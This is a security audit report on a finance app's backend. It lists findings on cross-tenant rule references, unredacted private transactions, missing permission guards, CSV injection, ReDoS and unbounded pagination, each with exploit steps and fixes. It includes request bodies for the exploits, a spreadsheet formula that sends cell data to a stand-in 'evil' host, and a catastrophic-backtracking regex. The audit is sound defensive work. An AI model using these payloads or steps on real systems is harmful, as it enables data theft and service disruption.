# Group 3 — transactions, categories, classification, payees, subscriptions, budgets, goals, balance

Commit audited: origin/main 43af3ca7 (detached worktree). All paths below are relative to `backend/`.

## Findings

| # | Severity | Confidence | Module | file:line | Title |
|---|----------|------------|--------|-----------|-------|
| 1 | HIGH | CONFIRMED | classification | `src/modules/classification/categorization-rules.controller.ts:243-262`, `:309-316`; `src/modules/classification/services/classification.service.ts:115-125` | Rule `result.categoryId` / `walletId` / `branchId` are never validated against the workspace → cross-tenant references written onto transactions on every import; foreign wallet/category rows then come back through `relations` |
| 2 | HIGH | CONFIRMED | transactions, classification | `categorization-rules.controller.ts:387-407`; `transactions.controller.ts:223-263`, `:344-354`, `:381-391`, `:140-150`, `:152-156`; `classification.controller.ts:32-56` | Private rows (`isPrivate`) are returned unredacted by six routes (rule test, duplicates/detect, transfer-candidates, reimbursement-candidates, PUT :id response, GET :id/split, POST classification/transaction/:id) |
| 3 | MEDIUM | CONFIRMED | classification | `src/modules/classification/classification.controller.ts:23-25` | `/classification/*` has no `PermissionsGuard`: a viewer/accountant can re-classify (write) any transaction; single-row route also overwrites manual categories |
| 4 | MEDIUM | CONFIRMED | balance | `src/modules/balance/balance.controller.ts:55-95` | All four balance-sheet write routes are guarded by `REPORT_VIEW`, which every viewer/accountant holds → read-only roles write snapshots, create/delete custom accounts, change risk classification |
| 5 | MEDIUM | CONFIRMED | goals, subscriptions, payees | `src/modules/goals/goal-flow.service.ts:438-460,552-567`; `src/modules/subscriptions/subscription-detection.service.ts:36-59,206`; `src/modules/payees/payees.service.ts:100-142` | Aggregates leak the merchant of private rows: goal-flow merchant nodes, subscription detection `vendorName`, payees list `lastSeen`/`transactionCount` |
| 6 | MEDIUM | CONFIRMED | subscriptions | `src/modules/subscriptions/subscriptions.controller.ts:73-112` | CSV export does not neutralise formula-leading cells (`=`, `+`, `-`, `@`) in `vendorName`/`owner` → CSV injection |
| 7 | LOW | CONFIRMED | classification | `classification.service.ts:288-294`; `categorization-rules.controller.ts:436-438` | `regex` operator compiles user-supplied patterns with no complexity limit (ReDoS on every import/classification run) |
| 8 | LOW | CONFIRMED | categories | `src/modules/categories/private-category.ts:118-128`; `categories.service.ts:122-150` | A user-created category named `Private` is adopted as the workspace's privacy bucket (`isSystem=false`), so it can later be renamed, re-parented, type-changed or deleted |
| 9 | LOW | CONFIRMED | transactions | `transactions.controller.ts:116-117`; `transactions.service.ts:163-166` | `limit` / `page` unbounded (`take(10_000_000)`), negative → DB error; DoS-ish |
| 10 | LOW | CONFIRMED | goals | `goals.controller.ts:89-102`; `goals.service.ts:364-377` | Cover thumbnail proxy is `@SkipThrottle` + JWT only (burns the shared Openverse allowance); stored covers are served from the unauthenticated static `/uploads/goal-covers/` mount (random names — accepted design, noted) |

### 1. Categorization rule results are not workspace-scoped (HIGH, CONFIRMED)

**Path.** `POST /categorization-rules` (`@WorkspaceAuth(CATEGORY_EDIT)`) → `CategorizationRulesController.create` validates only `dto.result.ownerMemberId` via `assertOwnerMemberInWorkspace`, then `categorizationRuleRepository.save({ userId, workspaceId, conditions, result: dto.result })` with `result.categoryId/branchId/walletId` taken verbatim. Same in `update` (`:309-316`). The contract `ClassificationResultInput` only types them as `Schema.optional(Schema.String)` — not even UUID-checked.

The rule is then applied by `ClassificationService.classifyTransaction` (`classification.service.ts:111-139`):

```ts
if (rule.result.categoryId) { classification.categoryId = rule.result.categoryId; ... }
if (rule.result.branchId)   { classification.branchId   = rule.result.branchId; }
if (rule.result.walletId)   { classification.walletId   = rule.result.walletId; }
```

and at `:172-174` the foreign wallet is looked up **without** workspace: `walletOwnerMemberId(walletId)` → `walletRepository.findOne({ where: { id: walletId } })` → `classification.ownerMemberId = wallet.ownerMemberId` (a member id of the *other* tenant, bypassing `assertOwnerMemberInWorkspace`).

Callers that persist the result verbatim: `statement-processing.service.ts:1061` (every statement import, `Object.assign`/`create` of the classification), `entity-import.service.ts:306`, `custom-tables.service.ts:351`, and `POST /classification/transaction/:id` + `/classification/bulk` (`Object.assign(transaction, classification); save()`). FKs on `transactions.category_id/wallet_id/branch_id` are plain single-column FKs (no composite `(id, workspace_id)`), so the DB accepts the cross-tenant pointer.

**Exploit.** Attacker A is any member of workspace A with `CATEGORY_EDIT` (owner/admin, or member with `canEditCategories`). A knows (or guesses — see below) a wallet id `W_B` / category id `C_B` of workspace B.
1. `POST /categorization-rules` `{ name: "x", conditions: [{ field: "counterparty_name", operator: "regex", value: "." }], result: { categoryId: "<C_B>", walletId: "<W_B>", branchId: "<Br_B>" }, priority: 999 }` → 201.
2. `POST /classification/transaction/<any own tx id>` (or import a statement).
3. `GET /transactions/<id>` → `findOne` with `relations: ['category','branch','wallet','payee']` returns B's `category` (name/color/icon/stoicClass/taxRelevant) and B's **wallet** (`name`, `accountNumber`, `bankName`, `currency`, `initialBalance`, `ownerMemberId`). `GET /transactions` does `leftJoinAndSelect('transaction.wallet','wallet')` → same leak on every row.
4. Side effects in B: B's wallet balance computations are per-workspace (`balance.service.ts:305-316` filters `transaction.workspaceId`), so B's numbers do not change, but A's rows now carry B's `ownerMemberId` and B's category/wallet ids (A→B references), and B's category/wallet deletion is blocked/cascaded by A's rows depending on the FK action.

Guessing: UUIDs are v4 so blind guessing is impractical; however ids leak through shared contexts (a user who is a member of both workspaces, a former member, shared links, audit exports). The brief classifies cross-tenant reference as HIGH regardless of id discoverability.

**Evidence** (`categorization-rules.controller.ts:243-262`):
```ts
await assertOwnerMemberInWorkspace(this.workspaceMemberRepository, workspaceId, dto.result?.ownerMemberId);
const rule = this.categorizationRuleRepository.create({
  userId: user.id, workspaceId, name: dto.name, ..., conditions: dto.conditions, result: dto.result, ...
```

**Fix.** In `create`/`update`, after the owner check: `countBy({ id: In([...]), workspaceId })` for `Category`, `Wallet`, `Branch` (same helper as `TransactionsService.assertWorkspaceOwned`) and 404 on mismatch; additionally scope `walletOwnerMemberId` by `transaction.workspaceId`. Add UUID checks to `ClassificationResultInput`.

**Existing test.** No. `cross-workspace-references.e2e-spec.ts:69` only covers `POST /categorization-rules/test` `transactionIds`; nothing posts a rule with a foreign `result.*`.

### 2. Private rows returned unredacted by multiple read paths (HIGH, CONFIRMED)

`redactPrivate`/`redactPrivateRows` (`common/utils/transaction-privacy.util.ts`) are only applied in `TransactionsService.findAll` and `findOneFor`. Every other route that returns `Transaction` rows (or their `counterpartyName`/`paymentPurpose`) skips it. A private row's id is visible to everyone (`GET /transactions` returns the row with masked fields but real `id`), so a non-owner member can feed the id back in:

| Route | Guard | What comes back for a private row owned by someone else |
|---|---|---|
| `POST /categorization-rules/test` `{ conditions:[{field:'amount',operator:'greater_than',value:-1}], transactionIds:[<private ids>] }` | `CATEGORY_VIEW` (every member incl. viewer) | `counterparty`, `purpose` of each matched row (`categorization-rules.controller.ts:398-406`) |
| `GET /transactions/duplicates/detect` | `TRANSACTION_VIEW` | `counterparty`, `purpose` for every row in every duplicate group (`transactions.controller.ts:240-260`); `findDuplicates` reads all rows of the workspace with no `isPrivate` filter |
| `GET /transactions/:id/transfer-candidates`, `GET /transactions/:id/reimbursement-candidates` | `TRANSACTION_VIEW` | full `Transaction` entities (`transfer-pairing.service.ts:158-174`, `:244-269`) — both the private row itself (`findOwned`, unredacted, used for the window) and private candidates |
| `PUT /transactions/:id` with `{}` or `{ comments: "x" }` | `TRANSACTION_EDIT` | `update()` returns `saved` = the full entity (`transactions.service.ts:323,345`); `applyPrivacy` only guards the `isPrivate` toggle, not editing/reading the row. The audit event also stores the unredacted before/after. |
| `GET /transactions/:id/split` | `TRANSACTION_VIEW` | `getSplitParts` returns raw rows with relations (`:740-752`) |
| `POST /classification/transaction/:id` | none (see #3) | returns the full `transaction` (`classification.controller.ts:55`) |
| `POST /transactions/:id/split`, `/duplicates/merge` | `TRANSACTION_EDIT` | split returns full parts; merge returns `master.counterparty` |

**Exploit.** Member M2 (viewer is enough for the first four) in a household workspace lists `/transactions`, collects ids whose `counterpartyName === '—'`, then `POST /categorization-rules/test` with those ids and a tautological condition → gets merchant and purpose for every private purchase of M1.

**Evidence** (`categorization-rules.controller.ts:396-406`):
```ts
matches: matches.map(t => ({ id: t.id, ..., counterparty: t.counterpartyName, purpose: t.paymentPurpose, ... }))
```

**Fix.** Pass `@WorkspaceMemberId()` into these handlers and run every returned row through `redactPrivateRows(rows, selfMemberId)` (rule test, duplicates/detect, candidates, split parts, update/split/classify responses); for the `update` audit diff, either redact or accept (audit is owner/admin only). Consider also excluding `isPrivate` rows from the duplicate/transfer candidate pools for non-owners.

**Existing test.** `transaction-privacy.e2e-spec.ts` covers `GET /transactions`, `GET /transactions/:id`-style reads, `PUT` toggling rules and `reports/top-categories` only; none of the routes above.

### 3. `/classification/*` has no permission check (MEDIUM, CONFIRMED)

`ClassificationController` is decorated `@UseGuards(JwtAuthGuard, WorkspaceContextGuard)` only — no `PermissionsGuard`/`@RequirePermission`, and `PermissionsGuard` is not global (`app.module.ts:333-343` registers Csrf/Jwt/Throttler). `WorkspaceContextGuard` only checks membership. Hence a **viewer** or **accountant** (read-only per `workspace-permissions.ts:102-107`) can:
- `POST /classification/transaction/:id` → re-runs rules/payee history and `save()`s category/wallet/branch/owner onto the row; this single-row route does **not** skip `categorySource === MANUAL` (only `bulk` does, `:92-95`), so it also overwrites a category the owner picked by hand.
- `POST /classification/bulk` → same over a list.
Both also bypass the `canEditStatements` member toggle that `TransactionsService.update` enforces via `ensureCanEditStatements`.

**Fix.** Replace with `@WorkspaceAuth(Permission.TRANSACTION_EDIT)` on both routes (and add the `keptManual` skip to the single route).
**Existing test.** No (`version-read-only.e2e-spec.ts` touches the route only for version semantics).

### 4. Balance-sheet writes guarded by `REPORT_VIEW` (MEDIUM, CONFIRMED)

`balance.controller.ts`: `PUT reports/balance/snapshot` (:55), `POST reports/balance/accounts` (:65), `DELETE reports/balance/accounts/:id` (:75), `PATCH reports/balance/accounts/:id/classification` (:86) all carry `@WorkspaceAuth(Permission.REPORT_VIEW)`. `REPORT_VIEW` is in `WORKSPACE_READ_PERMISSIONS` (`workspace-permissions.ts:45`) → granted to every member including VIEWER and ACCOUNTANT, and to a plain member with no toggles. The services do no further role check. A viewer can therefore rewrite any manual balance line (loans, property, equity), add/delete custom accounts and flip risk classification, which changes the net-worth/balance figures and the 80/20 risk warning for the whole workspace.

**Fix.** Introduce a write permission (e.g. `REPORT_EDIT` or reuse `WALLET_EDIT`/owner-admin bucket) on the four routes; by the permission table's "fails closed" rule a new permission lands in owner/admin territory.
**Existing test.** No.

### 5. Private-row merchant leaks through aggregates (MEDIUM, CONFIRMED)

The privacy design keeps amounts visible but hides *what* the row was. Three aggregates read `counterparty_name`/`vendor_normalized` of private rows:
- **Goal flow** `GET /goals/:id/flow` (`GOAL_VIEW`+`BUDGET_VIEW`, every member): `loadMerchantTotals` groups on `LOWER(TRIM(COALESCE(t.vendor_normalized, t.counterparty_name)))` with no `isPrivate` filter and emits `merchant:*` nodes named after it (`goal-flow.service.ts:449-459, 339-346`). Private rows live in the workspace's `Private` category, which is an ordinary enabled category: an admin creates a budget on it (`assertCategoryInWorkspace` passes), attaches it to a goal, and the flow lists every private merchant with totals. Any member with `BUDGET_CREATE`+`GOAL_CREATE` (owner/admin) can set this up; after that every member sees it.
- **Subscription detection** (`subscription-detection.service.ts:36-59, 206-207`): groups all verified expense rows by vendor; a private subscription (≥2 regular charges) becomes a `Subscription` with `vendorName`/`vendorRaw` = the private merchant, listed to everyone with `SUBSCRIPTION_VIEW` and pushed as a workspace-wide notification (`:135-146`).
- **Payees list** `GET /payees` (`TRANSACTION_VIEW`): `redactPrivate` nulls `payeeId` in transaction responses, but the payee row still exists and `transactionCount`/`lastSeen` (`payees.service.ts:120-121`) count the private row — "visited X on 2026-10-14" for a merchant that appears nowhere else.

**Fix.** Add `t.is_private = false` (or `t.is_private = false OR t.owner_member_id = :self`) to the merchant/vendor-level queries; exclude private rows from the payee `COUNT/MAX` join and from subscription detection (or detect per owner).
**Existing test.** No.

### 6. CSV injection in subscriptions business report (MEDIUM, CONFIRMED)

`subscriptions.controller.ts:86`: `cell = v => \`"${String(v).replace(/"/g,'""')}"\`` quotes but does not neutralise a leading `= + - @ \t \r`. `vendorName` is user-/import-controlled (`vendorName: txs[0].vendorNormalized ?? txs[0].counterpartyName` from bank data; also `POST /subscriptions`). A row `=HYPERLINK("http://evil/?"&A1)` lands in `business-subscriptions.csv` for Excel/LibreOffice. Owner names come from user profiles too.
**Fix.** Prefix cells starting with `=+-@\t\r` with `'` (or a space) in `cell()`. (The balance xlsx export uses `aoa_to_sheet` with string cells → no formula; not affected.)
**Existing test.** No.

### 7. ReDoS via `regex` rule operator (LOW, CONFIRMED)

`classification.service.ts:288-294` and `categorization-rules.controller.ts:436-438` do `new RegExp(conditionValue, 'i')` on a user-supplied pattern and run it against every row of every import for that user, plus synchronously in the rule-test route on up to N transactions. `(a+)+$` with a long counterparty string blocks the event loop. Scope: self-inflicted per workspace, but it is a shared Node process. **Fix.** Validate with `safe-regex`/`re2`, cap pattern length, or time-box. **Existing test.** No.

### 8. User-created `Private` category hijacks the privacy bucket (LOW, CONFIRMED)

`ensurePrivateCategory` finds `{ workspaceId, type, name: 'Private' }` regardless of `isSystem`. `CategoriesService.create` allows a user category named `Private` (only duplicate-name check). If it exists first, it becomes the bucket for every private row; since it is `isSystem=false`, `update`/`remove` allow renaming, re-parenting (so it shows up under a parent budget), changing `type`, or deleting it (`remove` only blocks tax-locked rows) — leaving private rows with `category_id` nulled and surfacing in "needs a category" lists. **Fix.** Add `isSystem: true` to the lookup and refuse creating/renaming a user category to the reserved name. **Existing test.** No.

### 9. Unbounded pagination (LOW, CONFIRMED)

`findAll` passes `Number.parseInt(limit)` straight to `take()`; `limit=100000000` dumps the workspace (with 6 joined relations) in one response; `limit=-1` → Postgres error → 500. **Fix.** Clamp 1..500. (Same for `subscriptions/upcoming?days`.) **Existing test.** No.

### 10. Goal cover proxy / static mount (LOW, CONFIRMED)

`GET /goals/covers/preview/:photoId` is `@UseGuards(JwtAuthGuard)` + `@SkipThrottle()`: any signed-in user can issue unlimited upstream Openverse thumbnail fetches (1000/day shared allowance) — the uuid pipe stops SSRF (fixed host `https://api.openverse.org/v1/images/`, no user URL), so this is only resource exhaustion. Stored covers are served via the unauthenticated static mount `/uploads/goal-covers/<uuid>.<ext>` (`goals.service.ts:373`, `main.ts:85`) — acknowledged in code; names are random, content is a public CC image, so accepted. **Fix.** Apply a per-user throttle to the preview route. **Existing test.** No.

## Per-module verdicts

- **transactions** — all 24 routes under `@WorkspaceAuth`; every repository call scoped by `workspaceId` (bulk-update loops `update(id, workspaceId)`; `In(ids)` in merge/link/unsplit carries `workspaceId`; attachments scoped, names generated, served with `attachment` disposition; `assertWorkspaceOwnedRefs` covers categoryId/branchId/walletId/ownerMemberId; split part categoryIds checked). Holes: #2 (unredacted private rows from update/split/candidates/duplicates responses), #9 (pagination). Note: non-owners may edit/delete/split a private row (only the `isPrivate` toggle is owner-gated) — design decision, flagged not scored.
- **categories** — 7 routes under `@WorkspaceAuth`, all lookups scoped, `parentId` scoped on create/update, `isSystem` rename/delete blocked, `Object.assign` limited to contract fields (no workspaceId/isSystem/userId in `UpdateCategoryBody`). Hole: #8 (reserved `Private` name not protected).
- **classification** — rules controller: all scoped by `userId+workspaceId`, test route scoped (covered by e2e). Holes: **#1 (HIGH) rule `result.categoryId/walletId/branchId` unscoped + unscoped `walletOwnerMemberId`**, #2 (rule test returns private rows), #3 (no PermissionsGuard on `/classification/*`), #7 (ReDoS). Engine helpers (`onlyPayeeEvidence`, `payeeHistoryQuery`, `matchByPayeeHistory`, `categoryForPayee`) all filter `workspaceId`; payee-history learning never reads other tenants' rows.
- **payees** — 6 routes under `@WorkspaceAuth`; `merge` scopes target and sources (`In(sourceIds), workspaceId`) and the raw UPDATEs carry `workspace_id`; `setTransactionPayee` scopes transaction/payee/category; ILIKE escaped; VIES call uses fixed host with country/VAT params. Hole: #5 (payee list exposes private-row counts/lastSeen) — minor.
- **subscriptions** — 16 routes under `@WorkspaceAuth`; all queries scoped; `categoryId` checked (e2e-covered); `assignOwner` verifies membership; crons filter `STANDARD_WORKSPACE`; `detectionMeta.transactionIds` re-scoped on confirm. Holes: #5 (detection ingests private rows), #6 (CSV injection).
- **budgets** — 7 routes under `@WorkspaceAuth`; `categoryId`/`goalId` scoped (e2e-covered for category); `UpdateBudgetBody` has no `categoryId` so `Object.assign` cannot re-point it; spending/stoic queries all `workspace_id`-scoped; `impact` chain scoped. Clean apart from the privacy-by-amount design (amounts of private rows are counted — intended).
- **goals** — 17 routes under `@WorkspaceAuth` (+1 JWT-only thumbnail proxy); goals/contributions/items/covers all scoped; cover `photoId` is a UUID into a fixed Openverse URL (no SSRF), stored file name random. Holes: #5 (flow merchant nodes leak private merchants), #10 (unthrottled proxy).
- **balance** — 7 routes under `@WorkspaceAuth`; accounts/snapshots scoped; wallet cash series filters `workspaceId` (comment confirms the earlier leak was fixed); xlsx export not formula-injectable. Hole: **#4 writes behind `REPORT_VIEW`**.

## Not checked / uncertainty

- `ViesService` (reference-data) and `openverse.util` internals (redirect following, response size caps) are outside this group; I verified only that the hosts are fixed and the user input is a uuid/VAT string.
- Whether `transactions.wallet_id`/`category_id` FKs are `ON DELETE SET NULL` vs `RESTRICT` (affects the blast radius of #1 on B's side) — not read from migrations.
- Id discoverability for #1 (needs a B wallet/category id): no leak path found inside this group; severity follows the brief's rule for A→B references.
- Frontend handling of the redacted placeholder is out of scope; backend redaction coverage was judged route by route.
